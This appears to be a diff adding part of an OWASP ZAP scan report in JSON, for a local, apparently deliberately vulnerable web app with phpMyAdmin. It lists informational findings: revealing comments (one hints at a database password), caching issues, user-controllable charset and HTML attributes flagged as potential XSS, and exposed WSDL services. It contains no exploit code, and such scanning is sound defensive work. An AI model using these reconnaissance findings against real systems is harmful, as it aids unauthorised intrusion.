+							"evidence": "nvoke an obscure IE bug when using iframes.",
+							"otherinfo": "The following pattern was used: \\bBUG\\b and was detected 4 times, the first in likely comment: \"// it can invoke an obscure IE bug when using iframes.\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "290",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/jquery.balloon.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/jquery.balloon.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": " if the event comes from the target or ballo",
+							"otherinfo": "The following pattern was used: \\bFROM\\b and was detected in likely comment: \"// True if the event comes from the target or balloon.\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "351",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/jquery.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/jquery.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "\t\tdataType: null,\n\t\tusername: null,\n\t\tpassword: ",
+							"otherinfo": "The following pattern was used: \\bUSERNAME\\b and was detected 2 times, the first in likely comment: \"/*\n\t\ttimeout: 0,\n\t\tdata: null,\n\t\tdataType: null,\n\t\tusername: null,\n\t\tpassword: null,\n\t\tcache: null,\n\t\tthrows: false,\n\t\ttradition\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "357",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/jquery.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/jquery.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "// Handle the case where IE and Opera return",
+							"otherinfo": "The following pattern was used: \\bWHERE\\b and was detected 15 times, the first in likely comment: \"// Handle the case where IE and Opera return items\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "355",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/jquery.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/jquery.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "// Logic borrowed from http://json.org/jso",
+							"otherinfo": "The following pattern was used: \\bFROM\\b and was detected 50 times, the first in likely comment: \"// Logic borrowed from http://json.org/json2.js\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "353",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/jquery.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/jquery.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "// Select is set to empty str",
+							"otherinfo": "The following pattern was used: \\bSELECT\\b and was detected 2 times, the first in likely comment: \"// Select is set to empty string on purpose\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "356",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/jquery.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/jquery.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "// TODO: Stop taunting the ",
+							"otherinfo": "The following pattern was used: \\bTODO\\b and was detected in likely comment: \"// TODO: Stop taunting the data cache; remove global events and always attach to document\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "352",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/jquery.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/jquery.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "//key/values into a query string",
+							"otherinfo": "The following pattern was used: \\bQUERY\\b and was detected in likely comment: \"//key/values into a query string\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "350",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/jquery.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/jquery.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "ChrisS here: http://bugs.jquery.com/ticket/1",
+							"otherinfo": "The following pattern was used: \\bBUGS\\b and was detected 3 times, the first in likely comment: \"// discovered by ChrisS here: http://bugs.jquery.com/ticket/12282#comment:15\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "348",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/jquery.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/jquery.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "Query prototype for later instantiation",
+							"otherinfo": "The following pattern was used: \\bLATER\\b and was detected 4 times, the first in likely comment: \"// Give the init function the jQuery prototype for later instantiation\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "349",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/jquery.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/jquery.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "ety goggles and see bug #4512 for more info",
+							"otherinfo": "The following pattern was used: \\bBUG\\b and was detected 11 times, the first in likely comment: \"// hidden; don safety goggles and see bug #4512 for more information).\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "354",
+							"uri": "http://host.docker.internal:25004/javascript/jQuery/jquery.js",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/jQuery\/jquery.js",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "n internal data and user-defined",
+							"otherinfo": "The following pattern was used: \\bUSER\\b and was detected 4 times, the first in likely comment: \"// cache in order to avoid key collisions between internal data and user-defined\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "161",
+							"uri": "http://host.docker.internal:25004/owasp-esapi-php/src/ESAPI.xml",
+							"nodeName": "http:\/\/host.docker.internal:25004\/owasp-esapi-php\/src\/ESAPI.xml",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "vel values are ALL, DEBUG, INFO, WARN, ERROR,",
+							"otherinfo": "The following pattern was used: \\bDEBUG\\b and was detected in likely comment: \"<!--\n        Logging level values are ALL, DEBUG, INFO, WARN, ERROR, FATAL and OFF.\n         -->\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "163",
+							"uri": "http://host.docker.internal:25004/owasp-esapi-php/src/ESAPI.xml",
+							"nodeName": "http:\/\/host.docker.internal:25004\/owasp-esapi-php\/src\/ESAPI.xml",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "will invalidate all user\n            passwor",
+							"otherinfo": "The following pattern was used: \\bUSER\\b and was detected 2 times, the first in likely comment: \"<!--\n            Algorithms WARNING: Changing these settings will invalidate all user\n            passwords, hashes, and encrypt\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "244",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/main.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "t db, table and sql query in the querywindow",
+							"otherinfo": "The following pattern was used: \\bQUERY\\b and was detected in likely comment: \"// set current db, table and sql query in the querywindow\", see evidence field for the suspicious comment/snippet."
+						},
+						{
+							"id": "251",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/navigation.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/navigation.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "t db, table and sql query in the querywindow",
+							"otherinfo": "The following pattern was used: \\bQUERY\\b and was detected in likely comment: \"// set current db, table and sql query in the querywindow\", see evidence field for the suspicious comment/snippet."
+						}
+					],
+					"count": "27",
+					"systemic": false,
+					"solution": "<p>Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.</p>",
+					"otherinfo": "<p>The following pattern was used: \\bUSER\\b and was detected in likely comment: \"<!-- I think the database password is set to blank or perhaps samurai.</p><p>\t\t\tIt depends on whether you installed this web app from \", see evidence field for the suspicious comment/snippet.</p>",
+					"reference": "",
+					"cweid": "615",
+					"wascid": "13",
+					"sourceid": "352"
+				},
+				{
+					"pluginid": "10109",
+					"alertRef": "10109",
+					"alert": "Modern Web Application",
+					"name": "Modern Web Application",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The application appears to be a modern web application. If you need to explore it automatically then the Client Spider may well be more effective than the standard one.</p>",
+					"instances":[ 
+						{
+							"id": "213",
+							"uri": "http://host.docker.internal:25004/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<a href=\"\">OWASP 2017</a>",
+							"otherinfo": "Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application."
+						},
+						{
+							"id": "222",
+							"uri": "http://host.docker.internal:25004/includes/main-menu.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/includes\/main-menu.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<a href=\"\">OWASP 2017</a>",
+							"otherinfo": "Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application."
+						},
+						{
+							"id": "223",
+							"uri": "http://host.docker.internal:25004/index.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<a href=\"\">OWASP 2017</a>",
+							"otherinfo": "Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application."
+						},
+						{
+							"id": "218",
+							"uri": "http://host.docker.internal:25004/index.php?page=xml-validator.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php (page)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<a href=\"\">OWASP 2017</a>",
+							"otherinfo": "Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application."
+						},
+						{
+							"id": "189",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "<script type=\"text/javascript\">\n// <![CDATA[\n    // definitions used in common.js\n    var common_query = 'lang=en&collation_connection=utf8_general_ci&token=e415c9425c5cbf8477d80e5bb28fe9cb';\n    var opendb_url = 'db_structure.php';\n    var safari_browser = false;\n    var querywindow_height = 400;\n    var querywindow_width = 600;\n    var collation_connection = 'utf8_general_ci';\n    var lang = 'en';\n    var server = '1';\n    var table = '';\n    var db    = '';\n    var token = 'e415c9425c5cbf8477d80e5bb28fe9cb';\n    var text_dir = 'ltr';\n    var pma_absolute_uri = 'http://host.docker.internal:25004/phpmyadmin/';\n    var pma_text_default_tab = 'Browse';\n    var pma_text_left_default_tab = 'Structure';\n\n    // for content and navigation frames\n\n    var frame_content = 0;\n    var frame_navigation = 0;\n    function getFrames() {\n        frame_content = window.frames[1];\n        frame_navigation = window.frames[0];\n    }\n    var onloadCnt = 0;\n    var onLoadHandler = window.onload;\n    window.onload = function() {\n        if (onloadCnt == 0) {\n            if (typeof(onLoadHandler) == \"function\") {\n                onLoadHandler();\n            }\n            if (typeof(getFrames) != 'undefined' && typeof(getFrames) == 'function') {\n                getFrames();\n            }\n            onloadCnt++;\n        }\n    };\n// ]]>\n</script>",
+							"otherinfo": "No links have been found while there are scripts, which is an indication that this is a modern web application."
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>This is an informational alert and so no changes are required.</p>",
+					"otherinfo": "<p>Links have been found that do not have traditional href attributes, which is an indication that this is a modern web application.</p>",
+					"reference": "",
+					"cweid": "-1",
+					"wascid": "-1",
+					"sourceid": "352"
+				},
+				{
+					"pluginid": "10049",
+					"alertRef": "10049-1",
+					"alert": "Non-Storable Content",
+					"name": "Non-Storable Content",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The response contents are not storable by caching components such as proxy servers. If the response does not contain sensitive, personal or user-specific information, it may benefit from being stored and cached, to improve performance.</p>",
+					"instances":[ 
+						{
+							"id": "7",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "no-store",
+							"otherinfo": ""
+						},
+						{
+							"id": "44",
+							"uri": "http://host.docker.internal:25004/database-offline.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/database-offline.php",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "no-store",
+							"otherinfo": ""
+						}
+					],
+					"count": "2",
+					"systemic": false,
+					"solution": "<p>The content may be marked as storable by ensuring that the following conditions are satisfied:</p><p>The request method must be understood by the cache and defined as being cacheable (\"GET\", \"HEAD\", and \"POST\" are currently defined as cacheable)</p><p>The response status code must be understood by the cache (one of the 1XX, 2XX, 3XX, 4XX, or 5XX response classes are generally understood)</p><p>The \"no-store\" cache directive must not appear in the request or response header fields</p><p>For caching by \"shared\" caches such as \"proxy\" caches, the \"private\" response directive must not appear in the response</p><p>For caching by \"shared\" caches such as \"proxy\" caches, the \"Authorization\" header field must not appear in the request, unless the response explicitly allows it (using one of the \"must-revalidate\", \"public\", or \"s-maxage\" Cache-Control response directives)</p><p>In addition to the conditions above, at least one of the following conditions must also be satisfied by the response:</p><p>It must contain an \"Expires\" header field</p><p>It must contain a \"max-age\" response directive</p><p>For \"shared\" caches such as \"proxy\" caches, it must contain a \"s-maxage\" response directive</p><p>It must contain a \"Cache Control Extension\" that allows it to be cached</p><p>It must have a status code that is defined as cacheable by default (200, 203, 204, 206, 300, 301, 404, 405, 410, 414, 501).</p>",
+					"otherinfo": "",
+					"reference": "<p>https://datatracker.ietf.org/doc/html/rfc7234</p><p>https://datatracker.ietf.org/doc/html/rfc7231</p><p>https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html</p>",
+					"cweid": "524",
+					"wascid": "13",
+					"sourceid": "1"
+				},
+				{
+					"pluginid": "10112",
+					"alertRef": "10112",
+					"alert": "Session Management Response Identified",
+					"name": "Session Management Response Identified",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The given response has been identified as containing a session management token. The 'Other Info' field contains a set of header tokens that can be used in the Header Based Session Management Method. If the request is in a context which has a Session Management Method set to \"Auto-Detect\" then this rule will change the session management to use the tokens identified.</p>",
+					"instances":[ 
+						{
+							"id": "2",
+							"uri": "http://host.docker.internal:25004",
+							"nodeName": "http:\/\/host.docker.internal:25004",
+							"method": "GET",
+							"param": "PHPSESSID",
+							"attack": "",
+							"evidence": "PHPSESSID",
+							"otherinfo": "cookie:PHPSESSID"
+						},
+						{
+							"id": "167",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/",
+							"method": "GET",
+							"param": "pma_collation_connection",
+							"attack": "",
+							"evidence": "pma_collation_connection",
+							"otherinfo": "cookie:pma_collation_connection\ncookie:phpMyAdmin"
+						}
+					],
+					"count": "2",
+					"systemic": false,
+					"solution": "<p>This is an informational alert rather than a vulnerability and so there is nothing to fix.</p>",
+					"otherinfo": "<p>cookie:PHPSESSID</p>",
+					"reference": "<p>https://www.zaproxy.org/docs/desktop/addons/authentication-helper/session-mgmt-id/</p>",
+					"cweid": "-1",
+					"wascid": "-1",
+					"sourceid": "7"
+				},
+				{
+					"pluginid": "10049",
+					"alertRef": "10049-3",
+					"alert": "Storable and Cacheable Content",
+					"name": "Storable and Cacheable Content",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>The response contents are storable by caching components such as proxy servers, and may be retrieved directly from the cache, rather than from the origin server by the caching servers, in response to similar requests from other users. If the response data is sensitive, personal or user-specific, this may result in sensitive information being leaked. In some cases, this may even result in a user gaining complete control of the session of another user, depending on the configuration of the caching components in use in their environment. This is primarily an issue where \"shared\" caching servers such as \"proxy\" caches are configured on the local network. This configuration is typically found in corporate or educational environments, for instance.</p>",
+					"instances":[ 
+						{
+							"id": "29",
+							"uri": "http://host.docker.internal:25004/documentation/?C=S;O=A",
+							"nodeName": "http:\/\/host.docker.internal:25004\/documentation\/ (C)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234."
+						},
+						{
+							"id": "46",
+							"uri": "http://host.docker.internal:25004/javascript/?C=N;O=D",
+							"nodeName": "http:\/\/host.docker.internal:25004\/javascript\/ (C)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234."
+						},
+						{
+							"id": "43",
+							"uri": "http://host.docker.internal:25004/owasp-esapi-php/",
+							"nodeName": "http:\/\/host.docker.internal:25004\/owasp-esapi-php\/",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234."
+						},
+						{
+							"id": "1",
+							"uri": "http://host.docker.internal:25004/robots.txt",
+							"nodeName": "http:\/\/host.docker.internal:25004\/robots.txt",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234."
+						},
+						{
+							"id": "0",
+							"uri": "http://host.docker.internal:25004/sitemap.xml",
+							"nodeName": "http:\/\/host.docker.internal:25004\/sitemap.xml",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234."
+						}
+					],
+					"count": "5",
+					"systemic": true,
+					"solution": "<p>Validate that the response does not contain sensitive, personal or user-specific information. If it does, consider the use of the following HTTP response headers, to limit, or prevent the content being stored and retrieved from the cache by another user:</p><p>Cache-Control: no-cache, no-store, must-revalidate, private</p><p>Pragma: no-cache</p><p>Expires: 0</p><p>This configuration directs both HTTP 1.0 and HTTP 1.1 compliant caching servers to not store the response, and to not retrieve the response (without validation) from the cache, in response to a similar request.</p>",
+					"otherinfo": "<p>In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234.</p>",
+					"reference": "<p>https://datatracker.ietf.org/doc/html/rfc7234</p><p>https://datatracker.ietf.org/doc/html/rfc7231</p><p>https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html</p>",
+					"cweid": "524",
+					"wascid": "13",
+					"sourceid": "50"
+				},
+				{
+					"pluginid": "10030",
+					"alertRef": "10030",
+					"alert": "User Controllable Charset",
+					"name": "User Controllable Charset",
+					"riskcode": "0",
+					"confidence": "1",
+					"riskdesc": "Informational (Low)",
+					"desc": "<p>This check looks at user-supplied input in query string parameters and POST data to identify where Content-Type or meta tag charset declarations might be user-controlled. Such charset declarations should always be declared by the application. If an attacker can control the response charset, they could manipulate the HTML to perform XSS or other attacks. For example, an attacker controlling the <meta> element charset value is able to declare UTF-7 and is also able to include enough user-controlled payload early in the HTML document to have it interpreted as UTF-7. By encoding their payload with UTF-7 the attacker is able to bypass any server-side XSS protections and embed script in the page.</p>",
+					"instances":[ 
+						{
+							"id": "378",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/export.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/export.php ()(charset_of_file,codegen_format,codegen_structure_or_data,compression,csv_columns,csv_enclosed,csv_escaped,csv_null,csv_removeCRLF,csv_separator,csv_structure_or_data,csv_terminated,db_select[],excel_columns,excel_edition,excel_null,excel_removeCRLF,excel_structure_or_data,export_method,export_type,filename_template,htmlword_columns,htmlword_null,htmlword_structure_or_data,json_structure_or_data,latex_caption,latex_columns,latex_comments,latex_data_caption,latex_data_continued_caption,latex_data_label,latex_null,latex_structure_caption,latex_structure_continued_caption,latex_structure_label,latex_structure_or_data,mediawiki_structure_or_data,ods_columns,ods_null,ods_structure_or_data,odt_columns,odt_comments,odt_null,odt_structure_or_data,output_format,pdf_report_title,pdf_structure_or_data,php_array_structure_or_data,quick_or_custom,remember_template,sql_auto_increment,sql_backquotes,sql_compatibility,sql_create_table_statements,sql_dates,sql_delayed,sql_disable_fk,sql_drop_database,sql_drop_table,sql_header_comment,sql_hex_for_blob,sql_if_not_exists,sql_ignore,sql_include_comments,sql_insert_syntax,sql_max_query_size,sql_procedure_function,sql_structure_or_data,sql_type,sql_use_transaction,sql_utc_time,texytext_columns,texytext_null,texytext_structure_or_data,token,what,yaml_structure_or_data)",
+							"method": "POST",
+							"param": "charset_of_file",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "A(n) [META] tag [Content-Type] attribute\n\nThe user input found was:\ncharset_of_file=utf-8\n\nThe charset value it controlled was:\nutf-8"
+						},
+						{
+							"id": "340",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/import.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/import.php ()(MAX_FILE_SIZE,allow_interrupt,charset_of_file,csv_col_names,csv_enclosed,csv_escaped,csv_ignore,csv_new_line,csv_replace,csv_terminated,format,import_file,import_type,noplugin,ods_col_names,ods_empty_rows,ods_recognize_currency,ods_recognize_percentages,skip_queries,sql_compatibility,sql_no_auto_value_on_zero,token)",
+							"method": "POST",
+							"param": "charset_of_file",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "A(n) [META] tag [Content-Type] attribute\n\nThe user input found was:\ncharset_of_file=utf-8\n\nThe charset value it controlled was:\nutf-8"
+						}
+					],
+					"count": "2",
+					"systemic": false,
+					"solution": "<p>Force UTF-8 in all charset declarations. If user-input is required to decide a charset declaration, ensure that only an allowed list is used.</p>",
+					"otherinfo": "<p>A(n) [META] tag [Content-Type] attribute</p><p></p><p>The user input found was:</p><p>charset_of_file=utf-8</p><p></p><p>The charset value it controlled was:</p><p>utf-8</p>",
+					"reference": "",
+					"cweid": "20",
+					"wascid": "20",
+					"sourceid": "4038"
+				},
+				{
+					"pluginid": "10031",
+					"alertRef": "10031",
+					"alert": "User Controllable HTML Element Attribute (Potential XSS)",
+					"name": "User Controllable HTML Element Attribute (Potential XSS)",
+					"riskcode": "0",
+					"confidence": "1",
+					"riskdesc": "Informational (Low)",
+					"desc": "<p>This check looks at user-supplied input in query string parameters and POST data to identify where certain HTML attribute values might be controlled. This provides hot-spot detection for XSS (cross-site scripting) that will require further review by a security analyst to determine exploitability.</p>",
+					"instances":[ 
+						{
+							"id": "221",
+							"uri": "http://host.docker.internal:25004/index.php?page=xml-validator.php",
+							"nodeName": "http:\/\/host.docker.internal:25004\/index.php (page)",
+							"method": "GET",
+							"param": "page",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:\n\nhttp://host.docker.internal:25004/index.php?page=xml-validator.php\n\nappears to include user input in:\na(n) [input] tag [value] attribute\n\nThe user input found was:\npage=xml-validator.php\n\nThe user-controlled value was:\nxml-validator.php"
+						},
+						{
+							"id": "273",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/main.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "collation_connection",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:\n\nhttp://host.docker.internal:25004/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb\n\nappears to include user input in:\na(n) [option] tag [value] attribute\n\nThe user input found was:\ncollation_connection=utf8_general_ci\n\nThe user-controlled value was:\nutf8_general_ci"
+						},
+						{
+							"id": "266",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/main.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "lang",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:\n\nhttp://host.docker.internal:25004/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb\n\nappears to include user input in:\na(n) [html] tag [xml:lang] attribute\n\nThe user input found was:\nlang=en\n\nThe user-controlled value was:\nen"
+						},
+						{
+							"id": "268",
+							"uri": "http://host.docker.internal:25004/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb",
+							"nodeName": "http:\/\/host.docker.internal:25004\/phpmyadmin\/main.php (collation_connection,lang,token)",
+							"method": "GET",
+							"param": "token",
+							"attack": "",
+							"evidence": "",
+							"otherinfo": "User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:\n\nhttp://host.docker.internal:25004/phpmyadmin/main.php?collation_connection=utf8_general_ci&lang=en&token=e415c9425c5cbf8477d80e5bb28fe9cb\n\nappears to include user input in:\na(n) [input] tag [value] attribute\n\nThe user input found was:\ntoken=e415c9425c5cbf8477d80e5bb28fe9cb\n\nThe user-controlled value was:\ne415c9425c5cbf8477d80e5bb28fe9cb"
+						}
+					],
+					"count": "4",
+					"systemic": false,
+					"solution": "<p>Validate all input and sanitize output it before writing to any HTML attributes.</p>",
+					"otherinfo": "<p>User-controlled HTML attribute values were found. Try injecting special characters to see if XSS might be possible. The page at the following URL:</p><p></p><p>http://host.docker.internal:25004/index.php?page=xml-validator.php</p><p></p><p>appears to include user input in:</p><p>a(n) [input] tag [value] attribute</p><p></p><p>The user input found was:</p><p>page=xml-validator.php</p><p></p><p>The user-controlled value was:</p><p>xml-validator.php</p>",
+					"reference": "<p>https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html</p>",
+					"cweid": "20",
+					"wascid": "20",
+					"sourceid": "643"
+				},
+				{
+					"pluginid": "90030",
+					"alertRef": "90030",
+					"alert": "WSDL File Detection",
+					"name": "WSDL File Detection",
+					"riskcode": "0",
+					"confidence": "2",
+					"riskdesc": "Informational (Medium)",
+					"desc": "<p>A WSDL File has been detected.</p>",
+					"instances":[ 
+						{
+							"id": "320",
+							"uri": "http://host.docker.internal:25004/webservices/soap/ws-hello-world.php?wsdl",
+							"nodeName": "http:\/\/host.docker.internal:25004\/webservices\/soap\/ws-hello-world.php (wsdl)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "text/xml; charset=ISO-8859-1",
+							"otherinfo": "A WSDL File has been detected."
+						},
+						{
+							"id": "304",
+							"uri": "http://host.docker.internal:25004/webservices/soap/ws-lookup-dns-record.php?wsdl",
+							"nodeName": "http:\/\/host.docker.internal:25004\/webservices\/soap\/ws-lookup-dns-record.php (wsdl)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "text/xml; charset=ISO-8859-1",
+							"otherinfo": "A WSDL File has been detected."
+						},
+						{
+							"id": "333",
+							"uri": "http://host.docker.internal:25004/webservices/soap/ws-user-account.php?wsdl",
+							"nodeName": "http:\/\/host.docker.internal:25004\/webservices\/soap\/ws-user-account.php (wsdl)",
+							"method": "GET",
+							"param": "",
+							"attack": "",
+							"evidence": "text/xml; charset=ISO-8859-1",
+							"otherinfo": "A WSDL File has been detected."
+						}
+					],
+					"count": "3",
+					"systemic": false,
+					"solution": "<p>Make your WSDL files visible only for technical issues (ex: testing purposes).</p>",
+					"otherinfo": "<p>A WSDL File has been detected.</p>",
+					"reference": "",
+					"cweid": "651",
+					"wascid": "13",
+					"sourceid": "1808"
+				}
+			]
+		}
+	],
+	"sequences":[
+	]
+
+}
